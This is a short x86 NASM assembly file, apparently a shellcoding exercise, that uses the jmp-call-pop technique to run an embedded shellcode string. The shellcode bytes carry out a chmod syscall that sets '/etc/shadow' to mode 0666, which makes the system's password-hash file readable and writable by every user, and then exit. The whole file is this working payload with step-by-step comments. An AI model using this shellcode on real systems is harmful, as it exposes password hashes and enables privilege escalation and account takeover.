; Filename: jmpCallPop.nasm
; Author:  Bobby Cooke
global _start
section .text
_start:
; 1. Jump to where our Shellcode string is
  jmp short call_shellcode
decoder:
  pop esi
jmp2_shellcode:
; 3. Now that the memory location of our string is on the top of the
;     stack, we will pass control to it using the jmp instruction.
  pop eax
  jmp eax
call_shellcode:
; 2. Call to the instruction that will jump us into our Shellcode
;    - Call is like jump, but stores the memory location of the next
;       instruction onto the Stack; which is our Shellcode.
  call jmp2_shellcode
  shellcode: db 0x99,0x6a,0x0f,0x58,0x52,0xe8,0x0c,\
      0x00,0x00,0x00,0x2f,0x65,0x74,0x63,0x2f,0x73,\
      0x68,0x61,0x64,0x6f,0x77,0x00,0x5b,0x68,0xb6,\
      0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
      0xcd,0x80
